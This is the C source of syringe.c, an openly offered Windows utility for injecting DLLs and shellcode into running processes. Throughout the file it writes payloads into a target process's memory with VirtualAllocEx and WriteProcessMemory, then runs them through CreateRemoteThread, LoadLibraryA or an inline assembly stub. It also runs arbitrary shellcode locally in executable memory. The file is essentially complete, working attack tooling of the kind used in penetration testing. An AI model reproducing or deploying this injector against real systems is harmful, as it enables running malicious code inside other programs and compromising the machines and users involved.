/*
 *  syringe.c v1.3
 *  A General Purpose DLL & Code Injection Utility
 *
 *  Author: Spencer McIntyre (@zeroSteiner)
 *
 *  Copyright (C) 2011  SecureState LLC
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#define MAXLINE 512
#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
#define REMOTE_ASSEMBLY_STUB_LENGTH_RELEASE 32
#define ATTACK_TYPE_DLL_INJECTION 1
#define ATTACK_TYPE_SHELL_CODE_INJECTION 2
#define ATTACK_TYPE_EXECUTE_SHELL_CODE 3

int InjectDLL(char *dll, int ProcessID);
int InjectShellcode(char *data, int ProcessID);
int ExecuteShellcode(char *data);
DWORD WINAPI RemoteExecPayloadStub(LPVOID lpParameter);
DWORD WINAPI LocalExecPayloadStub(LPVOID lpParameter);

int main(int argc, char* argv[]) {
	char dllPath[MAXLINE] = "";
	unsigned int pid = 0;
	unsigned int injResult;
	unsigned char attackType = 0;
	unsigned char numargs = 4;
	char *usageString = "Syringe v1.2\nA General Purpose DLL & Code Injection Utility\n\nUsage:\n\nInject DLL:\n\tsyringe.exe -1 [ dll ] [ pid ]\n\nInject Shellcode:\n\tsyringe.exe -2 [ shellcode ] [ pid ]\n\nExecute Shellcode:\n\tsyringe.exe -3 [ shellcode ]\n";

	if (argc < 2) {
		printf("%s", usageString);
		return 0;
	}
	if (strncmp(argv[1], "-1", 2) == 0) {
		attackType = ATTACK_TYPE_DLL_INJECTION;
	} else if (strncmp(argv[1], "-2", 2) == 0) {
		attackType = ATTACK_TYPE_SHELL_CODE_INJECTION;
	} else if (strncmp(argv[1], "-3", 2) == 0) {
		attackType = ATTACK_TYPE_EXECUTE_SHELL_CODE;
		numargs = 3;
	} else {
		printf("%s", usageString);
		return 0;
	}
	if (argc != numargs) {
		printf("%s", usageString);
		return 0;
	}

	if ((attackType == ATTACK_TYPE_DLL_INJECTION) || (attackType == ATTACK_TYPE_SHELL_CODE_INJECTION)) {
		pid = atoi(argv[3]);
		if (!pid) {
			printf("Invalid Process ID.\n");
			return 0;
		}
		if (attackType == ATTACK_TYPE_DLL_INJECTION) {
			GetFullPathNameA(argv[2], MAXLINE, dllPath, NULL);
			injResult = InjectDLL(dllPath, pid);
		} else if (attackType == ATTACK_TYPE_SHELL_CODE_INJECTION) {
			injResult = InjectShellcode(argv[2], pid);
		}

		if (injResult == 0) {
			printf("Successfully Injected.\n");
		} else {
			printf("Failed To Inject. \nError: ");
			switch (injResult) {
				case 1: { printf("Invalid Process ID.\n"); break; }
				case 2: { printf("Could Not Open A Handle To The Process.\n"); break; }
				case 3: { printf("Could Not Get The Address Of LoadLibraryA.\n"); break; }
				case 4: { printf("Could Not Allocate Memory In Remote Process.\n"); break; }
				case 5: { printf("Could Not Write To Remote Process.\n"); break; }
				case 6: { printf("Could Not Start The Remote Thread.\n"); break; }
			}
		}
	} else if (attackType == ATTACK_TYPE_EXECUTE_SHELL_CODE) {
		ExecuteShellcode(argv[2]);
	}
	return 0;
}

int InjectDLL(char *dll, int ProcessID) {
	HANDLE Proc, RemoteThread;
	LPVOID RemoteStringPtr, LoadLibAddr;
	int writeProcError;

	if(!ProcessID) {
		return 1;
	}
	Proc = OpenProcess(CREATE_THREAD_ACCESS, FALSE, ProcessID);
	if(!Proc) {
		return 2;
	}
	LoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	if (LoadLibAddr == NULL) {
		return 3;
	}
	RemoteStringPtr = (LPVOID)VirtualAllocEx(Proc, NULL, strlen(dll), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	if (RemoteStringPtr == NULL) {
		return 4;
	}
	writeProcError = WriteProcessMemory(Proc, (LPVOID)RemoteStringPtr, dll, strlen(dll), NULL);
	if (writeProcError == 0) {
		return 5;
	}
	RemoteThread = CreateRemoteThread(Proc, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddr, (LPVOID)RemoteStringPtr, NULL, NULL);
	if (RemoteThread == NULL) {
		return 6;
	}
	CloseHandle(Proc);
	return 0;
}

int InjectShellcode(char *data, int ProcessID) {
	HANDLE Proc, RemoteThread;
	void *RemoteStringPtr;
	void *RemoteStubPtr;
	int writeProcError;
	unsigned long oldprot;

	// Step 1, get a handle to a process
	if(!ProcessID) {
		return 1;
	}
	Proc = OpenProcess(CREATE_THREAD_ACCESS, FALSE, ProcessID);
	if(!Proc) {
		return 2;
	}

	// Step 2, write the shellcode to the remote process
	RemoteStringPtr = VirtualAllocEx(Proc, NULL, (strlen(data) + 1), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (RemoteStringPtr == NULL) {
		return 4;
	}
	writeProcError = WriteProcessMemory(Proc, RemoteStringPtr, data, strlen(data), NULL);
	if (writeProcError == 0) {
		return 5;
	}

	// Step 3, write the assembly stub that will call the shellcode in the remote process
	RemoteStubPtr = VirtualAllocEx(Proc, NULL, REMOTE_ASSEMBLY_STUB_LENGTH_RELEASE, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (RemoteStubPtr == NULL) {
		return 4;
	}
	VirtualProtect(RemoteExecPayloadStub, REMOTE_ASSEMBLY_STUB_LENGTH_RELEASE, PAGE_EXECUTE_READWRITE, &oldprot);
	writeProcError = WriteProcessMemory(Proc, RemoteStubPtr, RemoteExecPayloadStub, REMOTE_ASSEMBLY_STUB_LENGTH_RELEASE, NULL);
	if (writeProcError == 0) {
		return 5;
	}

	// Step 4, start the assembly stub in via a call to CreateRemoteThread()
	RemoteThread = CreateRemoteThread(Proc, NULL, NULL, (LPTHREAD_START_ROUTINE)RemoteStubPtr, (LPVOID)RemoteStringPtr, NULL, NULL);
	if (RemoteThread == NULL) {
		return 6;
	}
	CloseHandle(Proc);

	// Step 5, Profit.
	return 0;
}

int ExecuteShellcode(char *data) {
	HANDLE LocalThread;
	int tid;
	void *StringPtr;
	StringPtr = VirtualAlloc(NULL, (strlen(data) + 1), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	strncpy(StringPtr, data, strlen(data));
	LocalThread = CreateThread(NULL, 0, LocalExecPayloadStub, StringPtr, 0, &tid);
	printf("Waiting For Shellcode To Return... ");
	WaitForSingleObject(LocalThread, INFINITE);
	printf("Done.\n");
	return 0;
}

DWORD WINAPI RemoteExecPayloadStub(LPVOID lpParameter) {
	__asm {
		mov eax, [lpParameter]
		call eax

		// Exit function is thread, don't mess this up
		push 0
		call ExitThread
	}
	return 0;
}

DWORD WINAPI LocalExecPayloadStub(LPVOID lpParameter) {
	__try {
		__asm {
			mov eax, [lpParameter]
			call eax

			push 0
			call ExitThread
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER) {
	}

	return 0;
}
